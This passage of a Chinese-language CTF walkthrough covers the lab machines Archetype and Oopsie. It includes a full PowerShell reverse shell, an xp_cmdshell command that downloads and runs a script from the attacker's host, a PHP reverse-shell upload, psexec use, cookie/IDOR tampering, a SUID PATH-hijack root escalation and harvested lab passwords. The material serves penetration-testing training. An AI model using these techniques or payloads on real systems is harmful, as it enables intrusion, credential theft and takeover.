        &lt;DTSConfigurationFileInfo GeneratedBy<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;...&#34;</span> GeneratedFromPackageName<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;...&#34;</span> GeneratedFromPackageID<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;...&#34;</span> GeneratedDate<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;20.1.2019 10:01:34&#34;</span>/&gt;
    &lt;/DTSConfigurationHeading&gt;
    &lt;Configuration ConfiguredType<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Property&#34;</span> Path<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;\Package.Connections[Destination].Properties[ConnectionString]&#34;</span> ValueType<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;String&#34;</span>&gt;
        &lt;ConfiguredValue&gt;Data Source<span style=color:#f92672>=</span>.;Password<span style=color:#f92672>=</span>M3g4c0rp123;User ID<span style=color:#f92672>=</span>ARCHETYPE<span style=color:#ae81ff>\s</span>ql_svc;Initial Catalog<span style=color:#f92672>=</span>Catalog;Provider<span style=color:#f92672>=</span>SQLNCLI10.1;Persist Security Info<span style=color:#f92672>=</span>True;Auto Translate<span style=color:#f92672>=</span>False;&lt;/ConfiguredValue&gt;
    &lt;/Configuration&gt;
&lt;/DTSConfiguration&gt; 
</code></pre></div><p>这个文件包含了一些数据库连接参数的配置，我们得到帐密<code>ARCHETYPE\sql_svc，M3g4c0rp123</code>。</p>
<p><code>SQL Server</code>有两种身份验证方式：操作系统身份验证和数据库身份验证。这里我们得到的应该是前者，<code>ARCHETYPE</code>代表主机名，<code>sql_svc</code>代表具有数据库登录权限的操作系统用户名，<code>M3g4c0rp123</code>就是密码。</p>
<h2 id=2拿shell>2、拿Shell<a hidden class=anchor aria-hidden=true href=#2拿shell>#</a></h2>
<p>根据<code>nmap</code>扫描结果来看，靶机没有开启远程登录功能，所以可以从数据库下手。</p>
<p>需要的工具：<a href=https://github.com/SecureAuthCorp/impacket>SecureAuthCorp/impacket: Impacket is a collection of Python classes for working with network protocols. (github.com)</a></p>
<p>这是一个用<code>Python</code>编写的后工具集，本次渗透要用到其中的<code>mssqlclient.py</code>，安装过程不再赘述。</p>
<p>使用操作系统身份验证登录数据库：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth

<span style=color:#75715e># 输入密码后登录成功</span>
<span style=color:#75715e># 数据库身份认证启用了TLS</span>
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Encryption required, switching to TLS
<span style=color:#75715e># 当前数据库为master</span>
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ENVCHANGE<span style=color:#f92672>(</span>DATABASE<span style=color:#f92672>)</span>: Old Value: master, New Value: master
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ENVCHANGE<span style=color:#f92672>(</span>LANGUAGE<span style=color:#f92672>)</span>: Old Value: , New Value: us_english
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ENVCHANGE<span style=color:#f92672>(</span>PACKETSIZE<span style=color:#f92672>)</span>: Old Value: 4096, New Value: <span style=color:#ae81ff>16192</span>
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> INFO<span style=color:#f92672>(</span>ARCHETYPE<span style=color:#f92672>)</span>: Line 1: Changed database context to <span style=color:#e6db74>&#39;master&#39;</span>.
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> INFO<span style=color:#f92672>(</span>ARCHETYPE<span style=color:#f92672>)</span>: Line 1: Changed language setting to us_english.
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ACK: Result: <span style=color:#ae81ff>1</span> - Microsoft SQL Server <span style=color:#f92672>(</span><span style=color:#ae81ff>140</span> 3232<span style=color:#f92672>)</span> 
<span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Press help <span style=color:#66d9ef>for</span> extra shell commands
</code></pre></div><p>登录成功后使用<code>SQL Server</code>的<code>IS_SRVROLEMEMBER('sysadmin')</code>判断当前数据库用户是否具有<code>sysadmin</code>权限：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=color:#66d9ef>SELECT</span> IS_SRVROLEMEMBER(<span style=color:#e6db74>&#39;sysadmin&#39;</span>)
              
<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>结果</span>
<span style=color:#75715e>-----------   
</span><span style=color:#75715e></span>
          <span style=color:#ae81ff>1</span> 
</code></pre></div><p>返回结果为1，代表当前数据库用户具有<code>sysadmin</code>权限，可进一步尝试使用<code>xp_cmdshell</code>实现<code>RCE</code>：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=color:#f92672>#</span> sp_configure修改数据库配置的存储过程<span style=color:#960050;background-color:#1e0010>，当</span><span style=color:#66d9ef>show</span> advanced options参数为1时<span style=color:#960050;background-color:#1e0010>，才能够修改数据库配置中的某些高级选项，其中就有</span>xp_cmdshell<span style=color:#960050;background-color:#1e0010>，因此需要先设置</span><span style=color:#66d9ef>show</span> advanced options参数
<span style=color:#66d9ef>EXEC</span> sp_configure <span style=color:#e6db74>&#39;show advanced options&#39;</span>, <span style=color:#ae81ff>1</span>
[<span style=color:#f92672>*</span>] INFO(ARCHETYPE): Line <span style=color:#ae81ff>185</span>: Configuration <span style=color:#66d9ef>option</span> <span style=color:#e6db74>&#39;show advanced options&#39;</span> changed <span style=color:#66d9ef>from</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>to</span> <span style=color:#ae81ff>1</span>. Run the RECONFIGURE <span style=color:#66d9ef>statement</span> <span style=color:#66d9ef>to</span> install.

<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>提交上一步使用</span>sp_configure存储过程更改的配置选项
reconfigure

<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>使用</span>sp_configure存储过程启用xp_cmdshell参数<span style=color:#960050;background-color:#1e0010>，此参数启用后允许</span><span style=color:#66d9ef>SQL</span> Server调用操作系统命令
<span style=color:#66d9ef>EXEC</span> sp_configure <span style=color:#e6db74>&#39;xp_cmdshell&#39;</span>, <span style=color:#ae81ff>1</span>
[<span style=color:#f92672>*</span>] INFO(ARCHETYPE): Line <span style=color:#ae81ff>185</span>: Configuration <span style=color:#66d9ef>option</span> <span style=color:#e6db74>&#39;xp_cmdshell&#39;</span> changed <span style=color:#66d9ef>from</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>to</span> <span style=color:#ae81ff>1</span>. Run the RECONFIGURE <span style=color:#66d9ef>statement</span> <span style=color:#66d9ef>to</span> install.

<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>提交上一步使用</span> sp_configure存储过程更改的配置选项
reconfigure

<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>以上命令也可使用</span>mssqlclient的shell命令一步实现
enable_xp_cmdshell
[<span style=color:#f92672>*</span>] INFO(ARCHETYPE): Line <span style=color:#ae81ff>185</span>: Configuration <span style=color:#66d9ef>option</span> <span style=color:#e6db74>&#39;show advanced options&#39;</span> changed <span style=color:#66d9ef>from</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>to</span> <span style=color:#ae81ff>1</span>. Run the RECONFIGURE <span style=color:#66d9ef>statement</span> <span style=color:#66d9ef>to</span> install.
[<span style=color:#f92672>*</span>] INFO(ARCHETYPE): Line <span style=color:#ae81ff>185</span>: Configuration <span style=color:#66d9ef>option</span> <span style=color:#e6db74>&#39;xp_cmdshell&#39;</span> changed <span style=color:#66d9ef>from</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>to</span> <span style=color:#ae81ff>1</span>. Run the RECONFIGURE <span style=color:#66d9ef>statement</span> <span style=color:#66d9ef>to</span> install.
</code></pre></div><p>查看当前身份：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql>xp_cmdshell <span style=color:#e6db74>&#34;whoami&#34;</span>

<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>结果</span>
<span style=color:#66d9ef>output</span>                                                                             

<span style=color:#75715e>--------------------------------------------------------------------------------   
</span><span style=color:#75715e></span>
archetype<span style=color:#960050;background-color:#1e0010>\</span>sql_svc                                                                  

<span style=color:#66d9ef>NULL</span> 
</code></pre></div><p>查看是否存在开发环境：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql>xp_cmdshell <span style=color:#e6db74>&#34;python&#34;</span>

<span style=color:#f92672>#</span> <span style=color:#960050;background-color:#1e0010>结果</span>
<span style=color:#66d9ef>output</span>                                                                             

<span style=color:#75715e>--------------------------------------------------------------------------------   
</span><span style=color:#75715e></span>
<span style=color:#e6db74>&#39;python&#39;</span> <span style=color:#66d9ef>is</span> <span style=color:#66d9ef>not</span> recognized <span style=color:#66d9ef>as</span> an internal <span style=color:#66d9ef>or</span> <span style=color:#66d9ef>external</span> command,                     

operable program <span style=color:#66d9ef>or</span> batch file.                                                    

<span style=color:#66d9ef>NULL</span> 
</code></pre></div><h2 id=3获取用户权限>3、获取用户权限<a hidden class=anchor aria-hidden=true href=#3获取用户权限>#</a></h2>
<p>根据之前<code>nmap</code>的扫描结果，靶机应该为<code>Windows Server 2008 R2</code>，在没有开发环境的情况下可以考虑从<code>powershell</code>入手，建立一个<code>powershell</code>的反向<code>shell</code>文件1.ps1：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>$client = New-Object System.Net.Sockets.TCPClient(<span style=color:#e6db74>&#34;10.10.14.62&#34;</span>,443);
$stream = $client.GetStream();
<span style=color:#66d9ef>[byte[]]</span>$bytes = 0..65535|%{0};
<span style=color:#66d9ef>while</span>(($i = $stream.Read($bytes, 0, $bytes.Length)) <span style=color:#f92672>-ne</span> 0)
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2&gt;&amp;1 | Out-String );
$sendback2 = $sendback + <span style=color:#e6db74>&#34;# &#34;</span>;
$sendbyte = (<span style=color:#66d9ef>[text.encoding]</span>::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()};
$client.Close()
</code></pre></div><p>保存完文件后，不要切换目录，在当前目录起一个<code>HTTP</code>服务器：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 -m http.server <span style=color:#ae81ff>80</span>
</code></pre></div><p>开启本地监听：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nc -lvvp <span style=color:#ae81ff>443</span>
</code></pre></div><p>在数据库中执行命令下载并执行脚本：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql>xp_cmdshell <span style=color:#e6db74>&#34;powershell &#34;</span>IEX (<span style=color:#66d9ef>New</span><span style=color:#f92672>-</span><span style=color:#66d9ef>Object</span> Net.WebClient).DownloadString(<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#e6db74>&#34;http://10.10.14.62/1.ps1\&#34;</span>);<span style=color:#e6db74>&#34;
</span></code></pre></div><p>下载成功后可以看到<code>Web服务器</code>和<code>nc</code>都有对应的连接信息，切换到<code>nc</code>窗口，回车发现拿到了靶机的<code>shell</code>交互：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># 查看当前用户身份</span>
whoami
<span style=color:#75715e># 结果</span>
archetype\sql_svc

<span style=color:#75715e># 查看当前路径</span>
pwd
<span style=color:#75715e># 结果</span>
Path               
----               
C:\Windows\system32

<span style=color:#75715e># 查看桌面文件</span>
dir C:\Users\sql_svc\Desktop


    Directory<span style=color:#960050;background-color:#1e0010>:</span> C:\Users\sql_svc\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        2/25/2020   6<span style=color:#960050;background-color:#1e0010>:</span>37 AM             32 user.txt

<span style=color:#75715e># 查看user.txt</span>
type C:\Users\sql_svc\Desktop\user.txt
</code></pre></div><h2 id=4提权>4、提权<a hidden class=anchor aria-hidden=true href=#4提权>#</a></h2>
<p>查看<code>powershell</code>历史记录：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

<span style=color:#75715e># 结果</span>
net.exe use T: \\Archetype\backups /user<span style=color:#960050;background-color:#1e0010>:</span>administrator MEGACORP_4dm1n!!
exit
</code></pre></div><p>发现<code>administrator</code>将文件夹<code>\Archetype\backups</code>映射到<code>T盘</code>，<code>MEGACORP_4dm1n!!</code>为密码。</p>
<p>尝试使用<code>impakcet</code>中的<code>psexec.py</code>提权：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 psexec.py administrator@10.10.10.27

<span style=color:#75715e># 连接信息</span>
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Requesting shares on 10.10.10.27.....
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Found writable share ADMIN$
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Uploading file TPMzHnhC.exe
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Opening SVCManager on 10.10.10.27.....
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Creating service yQAe on 10.10.10.27.....
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting service yQAe.....
<span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Press help <span style=color:#66d9ef>for</span> extra shell commands
Microsoft Windows <span style=color:#f92672>[</span>Version 10.0.17763.107<span style=color:#f92672>]</span>
<span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2018</span> Microsoft Corporation. All rights reserved.

<span style=color:#75715e># 查看当前身份</span>
C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt;whoami
nt authority<span style=color:#ae81ff>\s</span>ystem

<span style=color:#75715e># 查看桌面目录</span>
dir C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>esktop
<span style=color:#75715e># 结果</span>
Directory of C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>esktop

01/20/2020  06:42 AM    &lt;DIR&gt;          .
01/20/2020  06:42 AM    &lt;DIR&gt;          ..
02/25/2020  07:36 AM                <span style=color:#ae81ff>32</span> root.txt
               <span style=color:#ae81ff>1</span> File<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>             <span style=color:#ae81ff>32</span> bytes
               <span style=color:#ae81ff>2</span> Dir<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>  33,833,361,408 bytes free
               
<span style=color:#75715e># 查看root.txt</span>
type C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\r</span>oot.txt
</code></pre></div><h1 id=oopsie>Oopsie<a hidden class=anchor aria-hidden=true href=#oopsie>#</a></h1>
<blockquote>
<p>目标：拿到用户权限与系统权限。</p>
<p>靶机IP：10.10.10.28。</p>
</blockquote>
<h2 id=1信息收集-1>1、信息收集<a hidden class=anchor aria-hidden=true href=#1信息收集-1>#</a></h2>
<p><code>nmap</code>查看靶机信息：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sudo nmap -sS -sV 10.10.10.28

<span style=color:#75715e># 结果</span>
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.28 <span style=color:#f92672>(</span>10.10.10.28<span style=color:#f92672>)</span>
Host is up <span style=color:#f92672>(</span>0.37s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
80/tcp open  http    Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>开启22和80端口，直接访问网页，发现有一个登录关键字，但是没有对应的链接：</p>
<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/Screen%20Shot%202021-09-14%20at%2009.30.19_2021%2009%2014%2009%2030%20.png alt="Screen Shot 2021-09-14 at 09.30.19">
</p>
<p>可能是将登录页面隐藏了，可通过两种方法进一步挖掘：</p>
<p>1、<code>F12</code>打开控制台查看页面元素，翻到最下面可以发现一个登录页面的<code>js</code>脚本：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/cdn-cgi/login/script.js&#34;</span>&gt;&lt;/<span style=color:#f92672>script</span>&gt;
</code></pre></div><p>2、<code>bp</code>抓包查看站点地图：</p>
<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/Screen%20Shot%202021-09-14%20at%2009.37.49_2021%2009%2014%2009%2037%20.png alt="Screen Shot 2021-09-14 at 09.37.49">
</p>
<p>进入登录页面后尝试帐密<code>admin/MEGACORP_4dm1n!!</code>，密码为上一关获得的<code>administrator </code>的密码。</p>
<p>登录成功后有一个文件上传功能，点击后显示<code>当前行为需要超级管理员权限</code>，抓包看一下当前的请求包：</p>
<pre tabindex=0><code>GET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1
Host: 10.10.10.28
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.28/cdn-cgi/login/admin.php
Connection: close
Cookie: user=34322; role=admin
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
</code></pre><p>发现<code>Cookie</code>处有一个<code>user</code>字段和<code>role</code>字段对当前身份进行判断，我们把当前数据包发送至<code>Inturder</code>模块，对<code>user</code>值爆破试试：</p>
<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/Screen%20Shot%202021-09-14%20at%2009.56.31_2021%2009%2014%2009%2056%20.png alt="Screen Shot 2021-09-14 at 09.56.31">
</p>
<p>值为<code>86575</code>时，文件上传功能正常。</p>
<p>但是这样跑太费时间了，再回头看看其他页面，发现访问<code>Account</code>页面时<code>URL</code>如下：</p>
<pre tabindex=0><code>http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&amp;id=1
</code></pre><p><code>id</code>的值应该有一些用处，尝试修改为1、2、3、4，发现到4时回显另一个用户的信息，<code>bp</code>抓包放进<code>Intruder</code>跑一下：</p>
<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/Screen%20Shot%202021-09-14%20at%2010.04.51_2021%2009%2014%2010%2005%20.png alt="Screen Shot 2021-09-14 at 10.04.51">
</p>
<p>同样获得了超级管理员的<code>Access ID</code>，接下来我们抓取访问文件上传页面的数据包，将<code>user</code>字段的值改为获取到的超级管理员的<code>Access ID</code>，转发后可成功进入文件上传页面，在选中文件后点击上传，再次修改转发包即可成功上传文件。</p>
<h2 id=2获取用户权限>2、获取用户权限<a hidden class=anchor aria-hidden=true href=#2获取用户权限>#</a></h2>
<p>上传文件后，下一步肯定需要知道文件的上传路径，使用<code>dirsearch</code>扫一下目录：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 dirsearch.py -u http://10.10.10.28/

<span style=color:#75715e># 结果</span>
<span style=color:#ae81ff>301</span> -  312B  - /uploads  -&gt;  http://10.10.10.28/uploads/
</code></pre></div><p>尝试上传一句话，蚁剑连接不上，使用<code>Kali</code>自带的<code>PHP</code>反弹<code>Shell</code>试试：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># 将自带Shell复制一份到当前目录</span>
cp /usr/share/webshells/php/php-reverse-shell.php ./

<span style=color:#75715e># 修改IP和port为本机信息</span>
$ip <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&lt;本机IP&gt;&#39;</span>
$port <span style=color:#f92672>=</span> &lt;监听端口&gt;
</code></pre></div><p>打开两个命令终端：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># 终端1，监听本机端口</span>
nc -lvvp &lt;监听端口&gt;

<span style=color:#75715e># 终端2，请求1.php</span>
curl http://10.10.10.28/uploads/1.php
</code></pre></div><p>运行完上述两条命令后，可以发现监听窗口反弹了一个<code>Shell</code>，权限为网站权限：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ id
uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
</code></pre></div><p>切换到网站目录：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cd /var/www/html

<span style=color:#75715e># 通过ls命令查看当前目录文件，直到最终切换到/var/www/html/cdn-cgi/login目录，发现有如下文件</span>
$ ls
admin.php
db.php
index.php
script.js

<span style=color:#75715e># 查看db.php</span>
$ cat db.php
&lt;?php
$conn <span style=color:#f92672>=</span> mysqli_connect<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;localhost&#39;</span>,<span style=color:#e6db74>&#39;robert&#39;</span>,<span style=color:#e6db74>&#39;M3g4C0rpUs3r!&#39;</span>,<span style=color:#e6db74>&#39;garage&#39;</span><span style=color:#f92672>)</span>;
?&gt;
</code></pre></div><p>我们得到了一个数据库的账号，接下来看看这个账号的信息：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ id robert             
uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>robert<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>robert<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>robert<span style=color:#f92672>)</span>,1001<span style=color:#f92672>(</span>bugtracker<span style=color:#f92672>)</span>
</code></pre></div><p>发现这个用户属于两个组，先查看一下这个用户的家目录：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ls /home/robert
user.txt
</code></pre></div><p><code>user.txt</code>就是用户的<code>flag</code>，接下来获取<code>root</code>的<code>flag</code>。</p>
<h2 id=3提权>3、提权<a hidden class=anchor aria-hidden=true href=#3提权>#</a></h2>
<p>从<code>bugtracker</code>用户组入手，查找其是否拥有特殊权限：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ find -type f -group bugtracker 2&gt;/dev/null
</code></pre></div><p>命令没有回显，执行以下命令升级<code>Shell</code>：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>SHELL<span style=color:#f92672>=</span>/bin/bash script -q /dev/null
</code></pre></div><p>继续执行之前的命令：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@oopsie:/$ find -type f -group bugtracker 2&gt;/dev/null
find -type f -group bugtracker 2&gt;/dev/null
./usr/bin/bugtracker
</code></pre></div><p>切换到<code>robert</code>用户：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@oopsie:/$ su - robert
</code></pre></div><p>查看<code>bugtracker</code>：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>robert@oopsie:~$ ls -la /usr/bin/bugtracker
ls -la /usr/bin/bugtracker
-rwsr-xr-- <span style=color:#ae81ff>1</span> root bugtracker <span style=color:#ae81ff>8792</span> Jan <span style=color:#ae81ff>25</span>  <span style=color:#ae81ff>2020</span> /usr/bin/bugtracker
</code></pre></div><p>发现其具有<code>s</code>权限，其作用在于用户可使用其所有者权限来运行程序，也就是说，在用户执行<code>bugtracker</code>程序时，将获取文件所有者，即<code>root</code>的权限及<code>UID</code>、<code>GID</code>。</p>
<p>运行<code>bugtracker</code>看看：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>robert@oopsie:~$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: <span style=color:#ae81ff>1</span>
<span style=color:#ae81ff>1</span>
---------------

Binary package hint: ev-engine-lib

Version: 3.3.3-1

Reproduce:
When loading library in firmware it seems to be crashed

What you expected to happen:
Synchronized browsing to be enabled since it is enabled <span style=color:#66d9ef>for</span> that site.

What happened instead:
Synchronized browsing is disabled. Even choosing VIEW &gt; SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
</code></pre></div><p>使用<code>strings</code>命令打印出可打印字符：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>robert@oopsie:~$ strings /usr/bin/bugtracker

<span style=color:#75715e># 发现命令调用</span>
cat /root/reports/
</code></pre></div><p><code>bugtracker</code>调用了系统的<code>cat</code>命令输出位于<code>/root/reports</code>目录下的<code>bug</code>报告，且调用<code>cat</code>命令时并未使用绝对路径，即在当前用户的<code>$PATH</code>环境变量中有相应配置。</p>
<h3 id=方法一>方法一<a hidden class=anchor aria-hidden=true href=#方法一>#</a></h3>
<p>我们可以创建一个名为<code>cat</code>的恶意命令并修改当前用户<code>$PATH</code>值，让<code>bugtracker</code>调用恶意构造的命令，进一步获取<code>root</code>权限。具体思路为：</p>
<p>以<code>robert</code>的身份将<code>/tmp</code>目录设置为<code>$PATH</code>环境变量的第一个目录，然后切换到<code>/tmp</code>目录构造恶意<code>cat</code>命令并赋执行权，使<code>bugtracker</code>实际上调用了恶意构造的<code>cat</code>命令。</p>
<p>命令如下：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>robert@oopsie:~$ echo $PATH
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
robert@oopsie:~$ export PATH<span style=color:#f92672>=</span>/tmp:$PATH
export PATH<span style=color:#f92672>=</span>/tmp:$PATH
robert@oopsie:~$ echo $PATH
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
robert@oopsie:~$ cd /tmp
cd /tmp
robert@oopsie:/tmp$ echo <span style=color:#e6db74>&#39;/bin/bash&#39;</span> &gt; cat
echo <span style=color:#e6db74>&#39;/bin/bash&#39;</span> &gt; cat
robert@oopsie:/tmp$ chmod +x cat
</code></pre></div><p>再次运行<code>bugtracker</code>就会以<code>root</code>身份执行一个<code>shell</code>了。</p>
